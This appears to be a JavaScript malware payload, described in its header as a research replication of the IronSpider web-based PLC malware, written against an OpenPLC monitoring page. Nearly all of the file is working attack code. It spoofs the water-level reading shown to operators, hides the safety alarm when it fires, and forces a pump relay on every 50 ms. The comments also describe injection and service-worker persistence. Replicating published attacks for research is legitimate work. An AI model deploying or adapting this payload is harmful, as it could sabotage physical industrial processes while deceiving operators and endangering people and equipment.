/*
 * IronSpider Simulation Payload — malware.js
 *
 * Research replication of NDSS 2024 "Compromising Industrial Processes
 * using Web-Based PLC Malware" (Pickren, Shekari, Zonouz, Beyah).
 *
 * In the real attack on WAGO 750 (CVE-2022-45140), this file is injected
 * by overwriting the transpiled WebVisu GUI file via the network_config API.
 * It is then cached by a service worker (sw.js) so it survives factory reset
 * and PLC hardware replacement.
 *
 * On OpenPLC this file is served as a static asset and registered as a SW
 * cache target. Deleting this file from static/ and reloading the page
 * triggers the SW resurrection mechanism.
 *
 * Three attack capabilities:
 *   Cap 1: Sensor spoofing    — display-layer only, deceives human operator
 *   Cap 2: Alarm suppression  — display-layer only, hides safety state
 *   Cap 3: Actuator manip.    — Modbus layer, directly affects physical process
 */

'use strict';

// ---------------------------------------------------------------------------
// Capability 1 + 2: Sensor spoofing and alarm suppression.
//
// Called by processReqChange() in the monitoring page inline script each time
// /monitor-update returns. Receives the raw HTML fragment, modifies it before
// it is written to the DOM, and returns the falsified fragment.
// ---------------------------------------------------------------------------
function ironspiderSpoof(html) {
    var temp = document.createElement('div');
    temp.innerHTML = html;
    var rows = temp.querySelectorAll('tr');

    rows.forEach(function(row) {
        var cells = row.querySelectorAll('td');
        if (cells.length < 5) return;
        var varName = cells[0].textContent.trim();

        // Capability 1: Sensor spoofing.
        // Read the real water level, record it in localStorage for later use
        // during actuator manipulation (matches the paper's data flow in Fig. 6),
        // then display a safe-looking constant (50%) to the operator.
        if (varName === 'water_level') {
            var pTag = cells[4].querySelector('p');
            if (pTag) {
                var realValue = parseInt(pTag.textContent.trim());
                localStorage.setItem('is_real_water_level', realValue);
                localStorage.setItem('is_spoof_timestamp', Date.now());
                pTag.textContent = '50';
                var bar = cells[4].querySelector('.w3-blue');
                if (bar) bar.style.width = '50%';
            }
        }

        // Capability 2: Alarm suppression.
        // When alarm_active transitions to TRUE (water > 95%), replace the
        // bool_true indicator with bool_false before the DOM update so the
        // operator never sees the alarm fire.
        if (varName === 'alarm_active') {
            var cell = cells[4];
            if (cell.innerHTML.indexOf('bool_true') !== -1) {
                cell.innerHTML = cell.innerHTML
                    .replace(/bool_true\.png/g, 'bool_false.png')
                    .replace(/alt="bool_true"/g, 'alt="bool_false"')
                    .replace(/>TRUE</g, '>FALSE<');
            }
        }
    });

    return temp.innerHTML;
}

// ---------------------------------------------------------------------------
// Capability 3: Actuator manipulation.
//
// Forces pump relay (%QX0.0) ON every 50ms regardless of what the ladder
// logic computes. The PLC scan cycle (500ms) will overwrite this with the
// logic output at each tick, so the pump-state toggles at scan-cycle frequency
// — exactly the racing condition documented in the lab notebook (Day 12).
// This is the Stuxnet-style physical-layer sabotage: the display shows normal,
// the physical actuator is being hammered.
// ---------------------------------------------------------------------------
var _is_manip_start = Date.now();
setInterval(function() {
    fetch('/point-write?value=1&address=%QX0.0').then(function() {
        localStorage.setItem('is_manip_elapsed_ms', Date.now() - _is_manip_start);
    });
}, 50);
